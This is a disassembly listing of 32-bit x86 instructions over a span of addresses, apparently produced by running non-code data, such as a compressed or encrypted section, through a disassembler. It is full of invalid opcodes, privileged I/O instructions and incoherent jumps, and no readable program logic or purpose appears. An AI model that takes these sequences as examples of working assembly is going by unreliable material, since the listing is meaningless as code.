  41ca7d:	inc    ebx
  41ca7e:	adc    al,0x30
  41ca80:	retf   
  41ca81:	sbb    cl,BYTE PTR [esi+ecx*2]
  41ca84:	outs   dx,BYTE PTR ds:[esi]
  41ca85:	js     0x41ca1a
  41ca87:	dec    ecx
  41ca88:	retf   
  41ca89:	jne    0x41ca48
  41ca8b:	mov    edx,ebp
  41ca8d:	in     eax,dx
  41ca8e:	int3   
  41ca8f:	inc    edx
  41ca90:	or     ecx,0x34cef4dd
  41ca96:	into   
  41ca97:	ret    0x288d
  41ca9a:	xchg   ebx,eax
  41ca9b:	cs xchg esi,eax
  41ca9d:	jo     0x41caca
  41ca9f:	or     al,BYTE PTR [ebx]
  41caa1:	cld    
  41caa2:	int3   
  41caa3:	(bad)  
  41caa4:	mov    bh,0x22
  41caa6:	mov    ah,0xba
  41caa8:	dec    esp
  41caa9:	jae    0x41cadd
  41caab:	fcomp  DWORD PTR [esi-0x6f]
  41caae:	push   esi
  41caaf:	add    BYTE PTR [ebx],al
  41cab1:	jno    0x41ca40
  41cab3:	arpl   WORD PTR [ebx-0x101c0ef6],si
  41cab9:	scas   eax,DWORD PTR es:[edi]
  41caba:	ins    BYTE PTR es:[edi],dx
  41cabb:	and    eax,0x575f0bbb
  41cac0:	les    edi,FWORD PTR [ebx-0xc60cbbf]
  41cac6:	xor    BYTE PTR [eax+edi*8],ch
  41cac9:	popa   
  41caca:	(bad)  
  41cacb:	repnz mov ebp,0x212071b9
  41cad1:	dec    eax
  41cad2:	sbb    DWORD PTR ds:0xd464641f,edx
  41cad8:	or     ecx,esp
  41cada:	pop    es
  41cadb:	push   ebp
  41cadc:	push   esi
  41cadd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cade:	repnz jecxz 0x41ca68
  41cae1:	jae    0x41caec
  41cae3:	jns    0x41cb23
  41cae5:	rcl    BYTE PTR [bp+di-0x12],1
  41cae9:	lahf   
  41caea:	lds    ecx,FWORD PTR [eax-0x6609cdd2]
  41caf0:	pop    ebx
  41caf1:	dec    edi
  41caf2:	fild   QWORD PTR [eax-0x30]
  41caf5:	aam    0x8
  41caf7:	pop    ebp
  41caf8:	cdq    
  41caf9:	imul   edx,DWORD PTR [edx-0x33c2b260],0x5f641211
  41cb03:	pusha  
  41cb04:	adc    al,0x89
  41cb06:	pop    ss
  41cb07:	fwait
  41cb08:	add    al,0x40
  41cb0a:	mov    DWORD PTR [edi-0x4906b3f1],edi
  41cb10:	inc    esp
  41cb11:	mov    bl,0x27
  41cb13:	cld    
  41cb14:	test   BYTE PTR [esi+0x2c9739f5],dl
  41cb1a:	lock bts eax,esi
  41cb1e:	jnp    0x41cb2c
  41cb20:	inc    edx
  41cb21:	cwde   
  41cb22:	in     al,dx
  41cb23:	cdq    
  41cb24:	mov    ch,BYTE PTR ds:0xd201c23
  41cb2a:	or     BYTE PTR [edi-0x10daea8c],ah
  41cb30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb31:	add    DWORD PTR [ebx+0x47],esi
  41cb34:	inc    eax
  41cb36:	or     eax,0x6c8b3931
  41cb3b:	ins    DWORD PTR es:[edi],dx
  41cb3c:	mov    BYTE PTR [eax],al
  41cb3e:	das    
  41cb3f:	cmp    BYTE PTR ds:0x5888363c,0x23
  41cb46:	pushf  
  41cb47:	out    0x5f,eax
  41cb49:	sbb    dh,BYTE PTR [ebx]
  41cb4b:	lods   eax,DWORD PTR ds:[esi]
  41cb4c:	pusha  
  41cb4d:	ds jmp 0x34c:0x9c8d386e
  41cb55:	dec    esi
  41cb56:	(bad)  
  41cb57:	sub    edi,ecx
  41cb59:	fwait
  41cb5a:	out    dx,al
  41cb5b:	pop    esi
  41cb5c:	adc    BYTE PTR [ebp+0x4c],bl
  41cb5f:	dec    ecx
  41cb60:	jb     0x41cb41
  41cb62:	lods   eax,DWORD PTR ds:[esi]
  41cb63:	fld    st(1)
  41cb65:	lahf   
  41cb66:	or     al,0x8
  41cb68:	in     eax,dx
  41cb69:	fisubr WORD PTR [edi-0x3a]
  41cb6c:	aad    0x4d
  41cb6e:	arpl   WORD PTR [edi+0x54c8b9b9],si
  41cb74:	je     0x41cbe2
  41cb76:	mov    ebp,DWORD PTR [edi-0x46]
  41cb79:	ror    BYTE PTR [edi+0x1051ad37],cl
  41cb7f:	ror    DWORD PTR [ebx-0x185840a7],1
  41cb85:	clc    
  41cb86:	pop    eax
  41cb87:	gs inc esp
  41cb89:	(bad)  
  41cb8b:	mov    ebx,DWORD PTR [esi-0x39]
  41cb8e:	loopne 0x41cb45
  41cb90:	fcmovu st,st(7)
  41cb92:	imul   ecx,DWORD PTR [edx],0xcc55ce34
  41cb98:	jbe    0x41cc08
  41cb9a:	retf   
  41cb9b:	(bad)  
  41cb9c:	(bad)  
  41cb9d:	outs   dx,DWORD PTR ds:[esi]
  41cb9e:	xlat   BYTE PTR ds:[ebx]
  41cb9f:	xchg   esp,eax
  41cba0:	xchg   edx,eax
  41cba1:	gs fs ja 0x41cc1e
  41cba5:	xchg   esi,eax
  41cba6:	sub    edi,DWORD PTR [esp+esi*1]
  41cba9:	sbb    bh,BYTE PTR [edi-0x33dfd902]
  41cbaf:	out    dx,al
  41cbb0:	sub    eax,0xbcf26315
  41cbb5:	daa    
  41cbb6:	pop    ebx
  41cbb7:	ja     0x41cbf0
  41cbb9:	leave  
  41cbba:	mov    ds:0xcf4e763,eax
  41cbbf:	imul   esi,DWORD PTR [edi],0xc683d69d
  41cbc5:	out    dx,al
  41cbc6:	and    eax,0xbb62f6ba
  41cbcb:	mov    bl,0xe7
  41cbcd:	pushf  
  41cbce:	xor    dh,BYTE PTR [eax+edx*1]
  41cbd1:	mov    ebx,0x751b9ad3
  41cbd6:	sub    BYTE PTR [ecx],ch
  41cbd8:	mov    ss:0x581214b8,eax
  41cbde:	dec    eax
  41cbdf:	pop    edx
  41cbe0:	xor    BYTE PTR [ebx+esi*4+0x4c],0x78
  41cbe5:	mov    esi,0xdef0d16f
  41cbea:	sti    
  41cbeb:	adc    cl,BYTE PTR [ecx+0x72]
  41cbee:	pop    es
  41cbef:	pushf  
  41cbf0:	adc    ecx,0xffffffc4
  41cbf3:	add    al,BYTE PTR [esp+esi*4]
  41cbf6:	sub    ch,ah
  41cbf8:	jl     0x41cbaa
  41cbfa:	fdivr  DWORD PTR [esi+edx*8-0x25c79c9c]
  41cc01:	pop    esp
  41cc02:	push   esi
  41cc03:	adc    al,0x21
  41cc05:	mov    dl,BYTE PTR [ebp-0xb52cef0]
  41cc0b:	test   BYTE PTR [edx+edx*4-0x430bef48],ah
  41cc12:	push   eax
  41cc13:	mov    eax,0xecaa0fb1
  41cc18:	xchg   ebp,eax
  41cc19:	cmp    DWORD PTR [eax+ebx*2],eax
  41cc1c:	jl     0x41cbb3
  41cc1e:	fs (bad) 
  41cc20:	pop    ds
  41cc21:	cmp    DWORD PTR [edx],esi
  41cc23:	sub    BYTE PTR [ebx+edi*8+0x554763b3],bh
  41cc2a:	inc    ecx
  41cc2b:	cmp    al,0x29
  41cc2d:	sub    al,0xf9
  41cc2f:	fwait
  41cc30:	cmp    dl,ah
  41cc32:	xchg   edx,eax
  41cc33:	ret    
  41cc34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc35:	sub    DWORD PTR [ebx+0x2],edx
  41cc38:	xchg   ebx,eax
  41cc39:	cdq    
  41cc3a:	ret    
  41cc3b:	push   ebp
  41cc3c:	mov    ch,0x5
  41cc3e:	test   al,0xbf
  41cc40:	inc    eax
  41cc41:	retf   
  41cc42:	push   ss
  41cc43:	loopne 0x41cc1d
  41cc45:	ds xchg ebp,eax
  41cc47:	in     eax,dx
  41cc48:	mov    ebx,0x50bb2cdf
  41cc4d:	test   BYTE PTR [ecx+0x642f6f0d],0xd5
  41cc54:	push   ebx
  41cc55:	jb     0x41cc68
  41cc57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc58:	call   0x2a2d:0xf9eb504e
  41cc5f:	cmp    cl,BYTE PTR [edx]
  41cc61:	es test eax,0xa65ee56f
  41cc67:	sbb    al,0x72
  41cc69:	jecxz  0x41cc43
  41cc6b:	pop    DWORD PTR [ebp+0x4a47800b]
  41cc71:	pop    esi
  41cc72:	mov    ds:0x6afe3eba,eax
  41cc77:	out    dx,eax
  41cc78:	sbb    DWORD PTR [esi+0x75ab7cd2],esi
  41cc7e:	pop    ebp
  41cc7f:	add    BYTE PTR [edi+0xb],0x1
  41cc83:	sub    DWORD PTR [esi],edi
  41cc85:	cdq    
  41cc86:	pop    eax
  41cc87:	jl     0x41cc24
  41cc89:	pop    ebp
  41cc8a:	cmp    ebp,edx
  41cc8c:	cld    
  41cc8d:	test   al,0x34
  41cc8f:	call   0x503d6680
  41cc94:	inc    ecx
  41cc95:	aam    0x9a
  41cc97:	jecxz  0x41cc30
  41cc99:	fsub   st,st(7)
  41cc9b:	push   ebx
  41cc9c:	ficomp WORD PTR [ebp+0x3edc82c2]
  41cca2:	scas   eax,DWORD PTR es:[edi]
  41cca3:	or     eax,0xdb9dcc58
  41cca8:	in     eax,dx
  41cca9:	mov    BYTE PTR [edi-0x51c9aad3],dl
  41ccaf:	shl    BYTE PTR [ebp+0x79a543b7],0x50
  41ccb6:	inc    esp
  41ccb7:	and    DWORD PTR [edi-0x20],edx
  41ccba:	iret   
  41ccbb:	bound  edi,QWORD PTR [ebx-0x80]
  41ccbe:	bound  esi,QWORD PTR [esi-0x3a044ff8]
  41ccc4:	sub    ch,bl
  41ccc6:	int    0x32
  41ccc8:	out    0xf5,eax
  41ccca:	int3   
  41cccb:	jmp    0x41cca5
  41cccd:	nop
  41ccce:	(bad)  
  41cccf:	popf   
  41ccd0:	pop    eax
  41ccd1:	jmp    0x41ccbf
  41ccd3:	cmp    DWORD PTR [ebp+0x4d],edi
  41ccd6:	out    0x2a,eax
  41ccd8:	jae    0x41cc95
  41ccda:	mov    edx,0xa6659208
  41ccdf:	and    DWORD PTR [esi-0x693d9c7a],ebx
  41cce5:	mov    edx,0xbedc18f7
  41ccea:	mov    ch,0x12
  41ccec:	xchg   ebx,eax
  41cced:	adc    eax,0xf7546a8f
  41ccf2:	into   
  41ccf3:	sti    
  41ccf4:	pusha  
  41ccf5:	lahf   
  41ccf6:	dec    esp
  41ccf7:	adc    DWORD PTR [edx-0x12a72612],edx
  41ccfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccfe:	inc    ecx
  41ccff:	pushf  
  41cd00:	mov    cl,0xa3
  41cd02:	ja     0x41cd20
  41cd04:	cmp    DWORD PTR [eax],ebx
  41cd06:	and    DWORD PTR [eax+0x6655625f],edi
  41cd0c:	add    al,0x4f
  41cd0e:	sbb    eax,0x37f6ff9c
  41cd13:	xor    bl,cl
  41cd15:	or     DWORD PTR [ebx+0x77f457f6],esi
  41cd1b:	xor    DWORD PTR [ecx-0x43b3532c],eax
  41cd21:	jmp    0x159f5067
  41cd26:	jb     0x41cd3c
  41cd28:	repnz adc esi,esi
  41cd2b:	push   ecx
  41cd2c:	cmp    eax,0x139a0818
  41cd31:	(bad)  
  41cd32:	xor    edi,DWORD PTR [esp+eax*2+0x7ca94268]
  41cd39:	and    bh,dh
  41cd3b:	and    BYTE PTR [edi],bh
  41cd3d:	push   ebp
  41cd3e:	add    bh,ah
  41cd40:	dec    DWORD PTR [esi-0x59]
  41cd43:	ror    edi,0xa5
  41cd46:	outs   dx,BYTE PTR ds:[esi]
  41cd47:	sar    DWORD PTR [eax+0x5f33f592],0x27
  41cd4e:	push   ebx
  41cd4f:	ds iret 
  41cd51:	adc    BYTE PTR [ebx-0xb415a78],al
  41cd57:	fwait
  41cd58:	push   cs
  41cd59:	scas   al,BYTE PTR es:[edi]
  41cd5a:	cmp    ebp,DWORD PTR [ecx]
  41cd5c:	and    BYTE PTR [ebp+0x3a0c847a],dh
  41cd62:	fst    QWORD PTR [ebp+0x78]
  41cd65:	ins    BYTE PTR es:[edi],dx
  41cd66:	mov    WORD PTR [ecx],?
  41cd68:	mov    cl,0x8
  41cd6a:	mov    dh,0xe4
  41cd6c:	jp     0x41cd10
  41cd6e:	jbe    0x41cd26
  41cd70:	jbe    0x41cdbb
  41cd72:	sub    BYTE PTR [ebp-0x35],bh
  41cd75:	pop    ss
  41cd76:	cwde   
  41cd77:	lods   al,BYTE PTR ds:[esi]
  41cd78:	loop   0x41cd8d
  41cd7a:	inc    esi
  41cd7b:	or     al,BYTE PTR [edi+0x1a4f35b5]
  41cd81:	(bad)  
  41cd82:	jg     0x41cdb1
  41cd84:	push   ecx
  41cd85:	(bad)  [edi-0x63f140b]
  41cd8b:	sbb    al,0xe3
  41cd8d:	sub    DWORD PTR [ecx+ecx*8-0x3da9d3ee],edi
  41cd94:	and    dl,BYTE PTR [eax]
  41cd96:	nop
  41cd97:	and    DWORD PTR [ebx+0x44],eax
  41cd9a:	call   0x8055:0x63cff2a1
  41cda1:	clc    
  41cda2:	mov    bh,0x7d
  41cda4:	cmp    eax,0x39b72ea3
  41cda9:	jns    0x41cd7c
  41cdab:	xchg   edx,eax
  41cdac:	cmc    
  41cdad:	push   edi
  41cdae:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41cdb0:	add    bh,BYTE PTR [edi-0xa]
  41cdb3:	pop    ecx
  41cdb4:	das    
  41cdb5:	pushf  
  41cdb6:	lahf   
  41cdb7:	mov    ch,0x9
  41cdb9:	cs sti 
  41cdbb:	fs gs mov cl,0xb9
  41cdbf:	pop    es
  41cdc0:	cmp    ah,BYTE PTR [ecx]
  41cdc2:	dec    ecx
  41cdc3:	adc    dh,ch
  41cdc5:	mov    ch,ch
  41cdc7:	es mov esp,0xbdd9a4a9
  41cdcd:	das    
  41cdce:	mov    ?,WORD PTR [ebp-0x3e]
  41cdd1:	iret   
  41cdd2:	nop
  41cdd3:	cmc    
  41cdd4:	pop    esp
  41cdd5:	and    bl,BYTE PTR [edi-0x74fa8beb]
  41cddb:	iret   
  41cddc:	jb     0x41ce41
  41cdde:	or     eax,0x2f5a89d9
  41cde3:	cmp    DWORD PTR [eax+0x2e855f83],ebx
  41cde9:	daa    
  41cdea:	jle    0x41cdbd
  41cdec:	xchg   DWORD PTR ds:0xc001f8da,ebp
  41cdf2:	xor    dh,bh
  41cdf4:	dec    edi
  41cdf5:	xchg   edi,eax
  41cdf6:	xchg   edi,eax
  41cdf7:	push   edx
  41cdf8:	cmp    esi,edi
  41cdfa:	jmp    FWORD PTR es:[edx]
  41cdfd:	and    eax,0x4011de09
  41ce02:	and    eax,0xe496c21d
  41ce07:	and    al,0x4e
  41ce09:	push   ebp
  41ce0a:	mov    ds:0xde6d5976,al
  41ce0f:	les    edi,FWORD PTR [eax-0x6f]
  41ce12:	mov    bh,0x95
  41ce14:	cmp    BYTE PTR [edx],bh
  41ce16:	inc    esp
  41ce17:	das    
  41ce18:	pop    ebp
  41ce19:	push   ss
  41ce1a:	xchg   ecx,eax
  41ce1c:	popa   
  41ce1d:	xchg   BYTE PTR [ebp+0x6a],ah
  41ce20:	lods   al,BYTE PTR ds:[esi]
  41ce21:	fadd   st(6),st
  41ce23:	(bad)  
  41ce24:	icebp  
  41ce25:	inc    edi
  41ce26:	xchg   ecx,eax
  41ce27:	rcr    BYTE PTR [ebp+ebp*4-0x7],0xd0
  41ce2c:	in     eax,dx
  41ce2d:	sub    edi,DWORD PTR [ecx+edi*4+0x18]
  41ce31:	cmp    al,0xe6
  41ce33:	xchg   ebp,eax
  41ce34:	repnz adc edi,DWORD PTR [esi+esi*1-0x686efa3f]
  41ce3c:	cmp    dh,BYTE PTR ds:0xe276a95f
  41ce42:	mov    ah,0xdb
  41ce44:	stos   BYTE PTR es:[edi],al
  41ce45:	stc    
  41ce46:	mov    ch,0xa2
  41ce48:	xor    DWORD PTR ds:0x602a7a20,ebx
  41ce4e:	out    0x4e,al
  41ce50:	call   FWORD PTR [ebx]
  41ce52:	mov    dl,0x81
  41ce54:	clc    
  41ce55:	out    dx,al
  41ce56:	push   es
  41ce57:	lock in al,dx
  41ce59:	jo     0x41cde5
  41ce5b:	xchg   ecx,eax
  41ce5c:	jl     0x41ceae
  41ce5e:	jno    0x41ce80
  41ce60:	fiadd  WORD PTR [ebp+0x5ec1c8f0]
  41ce66:	inc    eax
  41ce67:	test   DWORD PTR [ecx-0x2b],ecx
  41ce6a:	xchg   DWORD PTR [esi+0x76],ebp
  41ce6d:	test   BYTE PTR [edi-0x4b3070d1],ch
  41ce73:	out    0x3e,eax
  41ce75:	jg     0x41ce57
  41ce77:	and    al,ah
  41ce79:	xlat   BYTE PTR ds:[ebx]
  41ce7a:	pop    edi
  41ce7b:	aad    0xe9
  41ce7d:	or     DWORD PTR [eax+0x17],ecx
  41ce80:	in     al,0xe2
  41ce82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce83:	addr16 repz mov esp,0xb2e22a4f
  41ce8a:	inc    eax
  41ce8b:	data16 jno 0x41cecf
  41ce8e:	add    ebp,eax
  41ce90:	outs   dx,BYTE PTR ds:[esi]
  41ce91:	ror    DWORD PTR [edi],1
  41ce93:	xchg   edx,eax
  41ce94:	mov    dh,0x5a
  41ce96:	test   eax,0x8ee4258
  41ce9b:	and    al,0x57
  41ce9d:	push   ebx
  41ce9e:	cwde   
  41ce9f:	pop    ebx
  41cea0:	jnp    0x41ceb4
  41cea2:	es mov cl,0xbb
  41cea5:	out    0x73,al
  41cea7:	pop    es
  41cea8:	cmp    DWORD PTR [edi-0x759920f0],0x4147b784
  41ceb2:	std    
  41ceb3:	mov    ds:0xa3c513f0,al
  41ceb8:	sbb    eax,0x62bc64a0
  41cebd:	xor    eax,0xb8078f44
  41cec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cec3:	mov    WORD PTR [edx+0x4c],fs
  41cec6:	pop    eax
  41cec7:	ins    BYTE PTR es:[edi],dx
  41cec8:	aas    
  41cec9:	push   ds
  41ceca:	sbb    dl,bl
  41cecc:	dec    ebx
  41cecd:	mov    WORD PTR [esi-0x42],cs
  41ced0:	stos   BYTE PTR es:[edi],al
  41ced1:	pop    edx
  41ced2:	push   ebp
  41ced3:	adc    DWORD PTR ds:0x87350f60,esi
  41ced9:	(bad)  
  41ceda:	lea    edx,[ecx]
  41cedc:	add    dh,BYTE PTR gs:[ecx+0x716ac9ed]
  41cee3:	or     BYTE PTR [eax],dh
  41cee5:	popf   
  41cee6:	cmp    eax,edx
  41cee8:	jno    0x41cf1c
  41ceea:	test   al,0x20
  41ceec:	xchg   ecx,eax
  41ceed:	outs   dx,BYTE PTR ds:[esi]
  41ceee:	xor    dl,BYTE PTR [esi-0x1e]
  41cef1:	jecxz  0x41cf5c
  41cef3:	inc    ecx
  41cef4:	push   ecx
  41cef5:	cwde   
  41cef6:	in     eax,dx
  41cef7:	and    BYTE PTR [ecx+ebp*1+0x4dceecab],dh
  41cefe:	inc    eax
  41ceff:	iret   
  41cf00:	mov    ebx,DWORD PTR [ebp*2+0x37449071]
  41cf07:	push   esp
  41cf08:	cmp    al,0xf9
  41cf0a:	jns    0x41ced3
  41cf0c:	leave  
  41cf0d:	div    DWORD PTR [ecx]
  41cf0f:	xchg   edi,eax
  41cf10:	pop    ebx
  41cf11:	pop    es
  41cf12:	pop    edi
  41cf13:	in     al,0xcd
  41cf15:	sbb    DWORD PTR [edx+0x774740d4],edx
  41cf1b:	popf   
  41cf1c:	ins    DWORD PTR es:[edi],dx
  41cf1d:	imul   eax,ebp,0x1a5a5335
  41cf23:	shl    DWORD PTR [ecx+0x7ee20d54],cl
  41cf29:	add    eax,0x5072c274
  41cf2e:	jg     0x41cf0d
  41cf30:	pop    edx
  41cf31:	fdivr  DWORD PTR [esi-0xf]
  41cf34:	push   edi
  41cf35:	ss push ss
  41cf37:	dec    ebx
  41cf38:	xor    ah,dh
  41cf3a:	xchg   ecx,eax
  41cf3b:	call   0x5bef:0xb096ac86
  41cf42:	dec    edi
  41cf43:	inc    esi
  41cf44:	or     ch,al
  41cf46:	mov    ds:0xf6370f3b,al
  41cf4b:	adc    ebx,DWORD PTR [edi+0x28]
  41cf4e:	mov    esi,0xa9877790
  41cf53:	add    dl,BYTE PTR [ecx-0x16]
  41cf56:	fdivr  DWORD PTR [esp+eax*2]
  41cf59:	(bad)  
  41cf5a:	shl    DWORD PTR [esi],0x75
  41cf5d:	inc    si
  41cf5f:	xchg   ebx,eax
  41cf60:	fs push cs
	...
  41d13e:	jecxz  0x41d146
  41d140:	add    DWORD PTR [edi-0x1b],esi
  41d143:	ja     0x41d13c
  41d145:	xchg   esi,eax
  41d146:	popf   
  41d147:	mov    edx,0x20a9c648
  41d14c:	dec    BYTE PTR [eax]
  41d14e:	cmp    DWORD PTR [ecx+0x7220001],ebp
  41d154:	add    BYTE PTR [eax],al
  41d156:	and    eax,0xbe447585
  41d15b:	mov    ah,0xc7
  41d15d:	push   cs
  41d15e:	add    ecx,DWORD PTR [ecx-0x29e6c2e9]
  41d164:	call   0xc996ef57
  41d169:	test   DWORD PTR [ecx],ecx
  41d16b:	and    al,0x10
  41d16d:	mov    al,ds:0x9e97c5e1
  41d172:	std    
  41d173:	mov    edi,0xe7e6c057
  41d178:	adc    esi,DWORD PTR [eax-0x3fb38bd3]
  41d17e:	pop    es
  41d17f:	push   ecx
  41d180:	adc    dl,bl
  41d182:	xor    esi,DWORD PTR [eax+0x5526340]
  41d188:	inc    ecx
  41d189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d18a:	cmp    eax,0x58230fb
  41d18f:	or     bl,bl
  41d191:	add    al,0xb7
  41d193:	into   
  41d194:	or     eax,DWORD PTR [ebx+ebp*1]
  41d197:	rcr    ah,0x42
  41d19a:	aam    0x49
  41d19c:	jnp    0x41d1c5
  41d19e:	rcr    BYTE PTR [esi-0x1b],1
  41d1a1:	js     0x41d16c
  41d1a3:	push   ss
  41d1a4:	pop    edx
  41d1a5:	xchg   BYTE PTR ds:0x110e37e6,bh
  41d1ab:	fld    QWORD PTR [edx-0x538c3dea]
  41d1b1:	sub    DWORD PTR ds:0xbb4a17a9,ebp
  41d1b7:	pop    ebp
  41d1b8:	add    eax,0xbb260f88
  41d1bd:	sbb    BYTE PTR cs:[ecx-0x689b9026],dl
  41d1c4:	ins    BYTE PTR es:[edi],dx
  41d1c5:	xor    DWORD PTR ds:0x72925e23,eax
  41d1cb:	and    DWORD PTR [esi-0x9d8118d],0x9b50584f
  41d1d5:	or     al,0xec
  41d1d7:	inc    edi
  41d1d8:	in     al,dx
  41d1d9:	aad    0x49
  41d1db:	cld    
  41d1dc:	sbb    eax,0x4c957a56
  41d1e1:	in     al,dx
  41d1e2:	ffreep st(3)
  41d1e4:	cdq    
  41d1e5:	call   0x5cc696c0
  41d1ea:	in     eax,0x99
  41d1ec:	or     DWORD PTR [ebx],edi
  41d1ee:	xor    BYTE PTR [esi-0x6f],ch
  41d1f1:	jmp    0x41d232
  41d1f3:	cmp    DWORD PTR ds:0x467ebc64,ecx
  41d1f9:	pop    edi
  41d1fa:	mov    ebp,0x422f8785
  41d1ff:	out    dx,al
  41d200:	out    0xa7,al
  41d202:	ror    edx,1
  41d204:	push   ecx
  41d205:	mov    cl,0x69
  41d207:	daa    
  41d208:	jge    0x41d264
  41d20a:	ss jns 0x41d240
  41d20d:	pop    ebx
  41d20e:	loop   0x41d253
  41d210:	adc    dl,bh
  41d212:	push   eax
  41d213:	push   eax
  41d214:	add    al,0x6a
  41d216:	fs xchg esp,eax
  41d218:	daa    
  41d219:	in     al,dx
  41d21a:	shl    BYTE PTR [edi-0x7d],1
  41d21d:	jle    0x41d1ac
  41d21f:	and    DWORD PTR [edx+0x1f6403c5],ebp
  41d225:	mov    ds:0x8aa8dcbe,eax
  41d22a:	aad    0xaa
  41d22c:	mov    dh,0x3a
  41d22e:	xor    DWORD PTR [edx+0x2a45dab1],edi
  41d234:	enter  0xd75f,0x25
  41d238:	hlt    
  41d239:	adc    bh,BYTE PTR [edx-0x401128d1]
  41d23f:	(bad)  
  41d240:	out    0x74,eax
  41d242:	push   ecx
  41d243:	ficomp DWORD PTR [ebp+0x68]
  41d246:	scas   eax,DWORD PTR es:[edi]
  41d247:	jns    0x41d29d
  41d249:	shl    DWORD PTR [edx+0x52],0xc
  41d24d:	xchg   esi,eax
  41d24e:	call   0x6e5da878
  41d253:	in     al,dx
  41d254:	jne    0x41d267
  41d256:	stos   DWORD PTR es:[edi],eax
  41d257:	pop    ebx
  41d259:	pop    ecx
  41d25a:	push   esp
  41d25b:	shl    BYTE PTR [edx+0x29],0x8
  41d25f:	je     0x41d21f
  41d261:	cli    
  41d262:	sub    ebp,DWORD PTR [esi+0x60]
  41d265:	mov    ds:0x80abd249,eax
  41d26a:	xchg   ebp,eax
  41d26b:	test   eax,0x3ada7864
  41d270:	and    BYTE PTR [ecx],ah
  41d272:	arpl   WORD PTR [edx-0x60c0dc67],bp
  41d278:	(bad)  
  41d279:	mov    ds,WORD PTR [ebp+0x5d48fc62]
  41d27f:	imul   DWORD PTR [esi+ecx*8-0x38393683]
  41d286:	jnp    0x41d272
  41d288:	jnp    0x41d21c
  41d28a:	mov    gs,WORD PTR [esi]
  41d28c:	adc    ebp,eax
  41d28e:	nop
  41d28f:	sbb    al,BYTE PTR [esi]
  41d291:	push   ebx
  41d292:	shl    ch,cl
  41d294:	ret    0x71c9
  41d297:	push   ebp
  41d298:	pushf  
  41d299:	sbb    DWORD PTR [ebx-0x5639d399],ebp
  41d29f:	xchg   ecx,eax
  41d2a0:	jnp    0x41d315
  41d2a2:	push   ds
  41d2a3:	sbb    BYTE PTR [ebx-0x42],al
  41d2a6:	aas    
  41d2a7:	cmc    
  41d2a8:	xchg   ebp,eax
  41d2a9:	sub    dh,ch
  41d2ab:	pop    ebp
  41d2ac:	jbe    0x41d2c8
  41d2ae:	fsub   st(1),st
  41d2b0:	outs   dx,BYTE PTR ds:[esi]
  41d2b1:	ficomp DWORD PTR [ecx+0x49]
  41d2b4:	cdq    
  41d2b5:	jmp    0x43ce:0x3c5ce50b
  41d2bc:	lods   eax,DWORD PTR ds:[esi]
  41d2bd:	pop    esi
  41d2be:	into   
  41d2bf:	sbb    DWORD PTR [edx],eax
  41d2c1:	cwde   
  41d2c2:	jns    0x41d254
  41d2c4:	push   ss
  41d2c5:	imul   esp,ebp,0xffffff9b
  41d2c8:	gs pop es
  41d2ca:	les    edx,FWORD PTR [edx-0x59]
  41d2cd:	rcr    DWORD PTR [edx-0x75],cl
  41d2d0:	lds    edx,FWORD PTR [ebp+0x0]
  41d2d3:	ror    DWORD PTR [esp+edx*4-0xd808541],cl
  41d2da:	inc    edi
  41d2db:	inc    esi
  41d2dc:	jmp    0x8f87be48
  41d2e1:	es rol ebx,1
  41d2e4:	push   edx
  41d2e5:	imul   edx,DWORD PTR [edx],0x49169b7
  41d2eb:	mov    gs,WORD PTR [ecx-0x2]
  41d2ee:	rol    DWORD PTR [ebx-0x19cf3ba1],1
  41d2f4:	mov    BYTE PTR [eax+0xa350cd],bh
  41d2fa:	xchg   edi,eax
  41d2fb:	jnp    0x41d28b
  41d2fd:	out    dx,eax
  41d2fe:	push   ds
  41d2ff:	inc    edi
  41d300:	pusha  
  41d301:	push   ds
  41d302:	rcr    BYTE PTR [eax+0x78],0xba
  41d306:	ror    DWORD PTR [eax-0x391c16ac],0xf3
  41d30d:	mov    WORD PTR [edi+ebx*2-0x1126625],ss
  41d314:	mov    ebx,0xb0c3bfb
  41d319:	mov    al,ds:0xaefa5daa
  41d31e:	out    0xb0,al
  41d320:	sahf   
  41d321:	adc    esi,DWORD PTR [ecx+0x457ed7bb]
  41d327:	es push edx
  41d329:	cli    
  41d32a:	push   es
  41d32b:	push   ss
  41d32c:	inc    eax
  41d32d:	add    al,0xa8
  41d32f:	adc    al,0xe0
  41d331:	retf   
  41d332:	xchg   ebx,eax
  41d333:	jmp    0x1fb9:0xb96148d6
  41d33a:	shl    BYTE PTR [edi-0x35828f7a],1
  41d340:	or     eax,0xb56ea139
  41d345:	lahf   
  41d346:	or     al,0xd4
  41d348:	add    al,0x17
  41d34a:	push   ds
  41d34b:	jmp    0xab1493e4
  41d350:	imul   ecx,DWORD PTR [eax-0x3dd0ae6a],0x741ad580
  41d35a:	mov    esp,esp
  41d35c:	aas    
  41d35d:	stos   DWORD PTR es:[edi],eax
  41d35e:	cdq    
  41d35f:	mov    dh,0x56
  41d361:	ror    BYTE PTR gs:[edi+0x156b5b5e],0x84
  41d369:	mov    ds:0x7ad8d89b,al
  41d36e:	sbb    DWORD PTR [edi+0x60],ecx
  41d371:	mov    DWORD PTR [edi-0x37092ad5],esi
  41d377:	dec    esp
  41d378:	ss cli 
  41d37a:	jo     0x41d3e0
  41d37c:	and    DWORD PTR [eax+0xb],edx
  41d37f:	repnz mov dh,0xfd
  41d382:	and    ecx,DWORD PTR [esi]
  41d384:	add    eax,0xdd82cdee
  41d389:	test   al,0xf6
  41d38b:	cmc    
  41d38c:	push   eax
  41d38d:	mov    cl,0xa7
  41d38f:	inc    ecx
  41d390:	fnstcw WORD PTR [ebp-0x30dae8bf]
  41d396:	out    0x49,eax
  41d398:	lea    ecx,[edx+0x4e3c0a83]
  41d39e:	scas   eax,DWORD PTR es:[edi]
  41d39f:	jae    0x41d3c8
  41d3a1:	retf   
  41d3a2:	dec    eax
  41d3a3:	mov    ah,0xe6
  41d3a5:	and    DWORD PTR [ecx+edi*4-0x74],0xd1b69587
  41d3ad:	fs mov edi,0xfd6e4212
  41d3b3:	iret   
  41d3b4:	ins    BYTE PTR es:[edi],dx
  41d3b5:	(bad)  
  41d3b6:	mov    ebx,0xe6bacfa8
  41d3bb:	int3   
